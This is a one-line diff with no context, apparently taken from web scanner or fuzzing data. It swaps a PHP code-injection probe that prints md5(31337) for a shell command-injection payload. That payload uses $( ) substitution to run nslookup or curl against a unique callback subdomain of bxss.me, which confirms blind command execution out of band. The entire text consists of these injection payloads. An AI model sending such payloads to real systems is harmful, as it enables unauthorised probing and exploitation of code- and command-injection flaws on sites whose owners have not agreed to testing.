@@ -1,1 +1,1 @@
-';print(md5(31337));$a='
+$(nslookup -q=cname hitosgnrnngkz82254.bxss.me||curl hitosgnrnngkz82254.bxss.me)
